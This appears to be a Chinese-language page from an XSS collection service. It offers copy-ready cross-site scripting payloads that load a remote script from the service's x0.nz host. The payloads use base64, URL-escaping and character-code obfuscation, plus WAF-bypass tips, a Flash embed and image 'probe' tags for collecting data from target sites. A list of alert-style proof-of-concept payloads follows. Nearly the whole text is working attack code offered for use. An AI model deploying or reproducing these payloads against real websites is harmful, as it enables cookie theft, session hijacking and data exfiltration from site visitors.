```
</tExtArEa>'"><sCRiPt sRC=//x0.nz/T4yt></sCrIpT>
```



或者



```
'"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veDAubnovVDR5dCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>
'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veDAubnovVDR5dCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
</tEXtArEa>'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22https%3A%2F%2Fx0.nz%2FT4yt%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>
<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='//x0.nz/T4yt';>
```





下方XSS代码过一般WAF [注意如果直接把代码放入Burp，则需要把下方代码进行[URL编码](http://tool.chinaz.com/tools/urlencode.aspx)]



```
<embed src=https://x0.nz/liuyan/xs.swf?a=e&c=doc\u0075ment.write(St\u0072ing.from\u0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,48,46,110,122,47,84,52,121,116,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash></embed>
```



若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选“基础默认XSS”模块)



```
<img src="" onerror="document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,48,46,110,122,47,84,52,121,116,62,60,47,115,67,114,73,112,84,62))">
```



↓↓↓！~极限代码~！(可以不加最后的>回收符号，下面代码已测试成功)↓↓↓



```
<sCRiPt/SrC=//x0.nz/T4yt>
```







------

------

↓↓↓图片探测系统，只要对方网站可以调用外部图片(或可自定义HTML)，请填入下方图片地址(代码)，则探测对方数据↓↓↓

图片插件一：  **https://x0.nz/T4yt/test.jpg**   【[若使用此探测，必须勾选‘默认模块’！！！点击查看使用说明](https://woj.app/1785.html)】



```
<Img srC=https://x0.nz/T4yt/test.jpg> or <Img srC="https://x0.nz/T4yt/test.jpg">
```





```
<Img sRC=//x0.nz/T4yt/test.jpg>
```



------

图片插件二：  【[若使用此探测，建议勾选‘默认模块’。点击查看使用说明](https://woj.app/3377.html)】

![可右键保存此文件到本地，此图片文件已含有当前项目XSS代码，建议勾选[默认模块]使用。](https://g)

------

<img src=x onerror=alert(String.fromCharCode(76,49,57,49,55));>

<details%20ontoggle=alert(1)>

```
</p>"</textarea><a draggable="true" "ondragenter=confirm(1)" src="<script>alert(1)</script>">test111</a></textarea>

</p>"</textarea><a onbeforecopy="prompt(1)" contenteditable>test222</a></textarea>

</p>"</textarea><applet oncut=confirm(1) value="XSS" autofocus tabindex=1>test</textarea>

</p>"</textarea><strong draggable="true" ondragenter=confirm(1) style="width:100px,height:100px">test</textarea>

</p>"<iframe οnlοad="prompt(1)"></iframe>

</p>"<iframe src=""><a href="javascript:alert(1)">Click</a></iframe>

</p>"<iframe src="javascript:alert(1)">test</iframe>

</p>"<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

</p>"<iframe src="//xxx.cc/xxx/test.jpg"></iframe>

</p>"<iframe src="//t00ls.xxx.tu4.org"></iframe>

</p>"<iframe src="javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))"></iframe>

</p>"test<iframe src="data:text/html,<script>confirm(/xss/)</script>"></iframe>

</p>"test<iframe src="<script>alert(1)</script>"></iframe>

</p>"<iframe src=""<script>alert(1)</script>"http://test.xxx.xxx.cn/#draggable="true" "ondragenter=confirm(1)"/home">test</iframe> `



<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'>
<image href='1' onerror='alert(1)' /></svg>#x" />
<use id=x />




<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)' /></svg>#x" />
```
